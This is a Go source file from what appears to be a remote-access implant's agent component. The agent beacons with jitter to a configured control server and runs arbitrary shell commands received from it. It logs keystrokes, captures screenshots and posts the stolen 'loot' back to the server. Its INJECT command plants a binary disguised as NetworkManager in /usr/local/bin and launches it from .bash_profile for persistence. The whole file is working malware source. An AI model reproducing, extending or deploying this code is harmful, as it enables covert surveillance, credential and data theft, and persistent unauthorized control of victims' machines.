package agent

import (
	"bytes"
	"io"
	"log/slog"
	"math/rand/v2"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/hardal7/pex/internal/config"
)

func Serve() {
	for {
		makeRequest()
		delay := float32(config.Jitter) * rand.Float32()
		time.Sleep(time.Duration(float32(config.Interval)+delay) * time.Second)
	}
}

type Loot struct {
	Kind    string
	Content string
}

type ClientState struct {
	IsRegistered  bool
	UUID          string
	Username      string
	IsLoggingKeys bool
	PreviousKeys  string
}

var state ClientState

func makeRequest() {
	requestURL := "http://" + config.Host + ":" + config.BeaconPort
	request, _ := http.NewRequest("GET", requestURL, nil)
	setHeaders(*request)
	if state.IsRegistered == false {
		request.Header.Set("Register", "true")
	}

	response, err := http.DefaultClient.Do(request)
	if err != nil {
		slog.Info("Failed to send request to server: " + err.Error())
		return
	} else {
		slog.Info("Sent ping to server")
	}

	body, _ := io.ReadAll(response.Body)
	if len(body) != 0 {
		if state.IsRegistered == false {
			state.UUID = string(body)
			slog.Info("Registered to server with UUID: " + state.UUID)
			state.IsRegistered = true
			return
		}
		command := strings.Fields(string(body[:]))
		loot := runCommand(command)

		slog.Info("Sending loot to server")
		if loot.Kind == "Image" {
			buffer, _ := os.ReadFile(loot.Content)
			request, _ = http.NewRequest("POST", requestURL, bytes.NewBuffer(buffer))
			request.Header.Set("Content-Type", "image/png")
		} else {
			request, _ = http.NewRequest("POST", requestURL, bytes.NewBuffer([]byte(loot.Content)))
			request.Header.Set("Content-Type", "text/plain")
		}
		setHeaders(*request)
		go readKeys(*request)

		_, err := http.DefaultClient.Do(request)
		if err != nil {
			slog.Info("Failed sending loot to server: " + err.Error())
		} else {
			slog.Info("Sent loot to server")
		}
	} else {
		slog.Info("Received ping from server")
	}
}

func setHeaders(r http.Request) {
	if state.Username == "" {
		slog.Info("Getting username")
		state.Username = strings.TrimSpace(ExecuteCommand([]string{"whoami"}))
	}
	r.Header.Set("Username", state.Username)
	r.Header.Set("UUID", state.UUID)
}

func readKeys(request http.Request) {
	if state.IsLoggingKeys {
		var keysLoot string
		mu.Lock()
		keysLoot = strings.TrimPrefix(keysPressed, state.PreviousKeys)
		state.PreviousKeys = keysPressed
		mu.Unlock()
		if len(keysPressed) != 0 {
			request.Header.Set("Keys", keysLoot)
			http.DefaultClient.Do(&request)
		}
	}
}

func runCommand(command []string) Loot {
	slog.Info("Executing command: " + command[0])

	var loot Loot
	switch command[0] {
	case "INJECT":
		const injectCommand string = "echo '/usr/local/bin/NetworkManager' >> /home/$(whoami)/.bash_profile; mv ./NetworkManager /usr/local/bin/NetworkManager"
		loot.Content = ExecuteCommand([]string{injectCommand})
	case "SESSION":
		go JoinSession()
	case "INTERVAL":
		if len(command) > 1 {
			interval, err := strconv.Atoi(command[1])
			if err == nil {
				config.Interval = interval
			}
		}
	case "LOGKEYS":
		state.IsLoggingKeys = true
		go LogKeyboard()
	case "STOP-LOGKEYS":
		state.IsLoggingKeys = false
		// TODO: Signal go routine to stop
	case "SCREEN":
		screenshots := CaptureScreen()
		loot.Kind = "Image"
		// TODO: Send more than 1 screenshot for multiple monitor setups
		loot.Content = screenshots[0]
	default:
		loot.Content = ExecuteCommand(command)
		slog.Info("Output:\n" + loot.Content)
	}
	slog.Info("Executed command")

	return loot
}
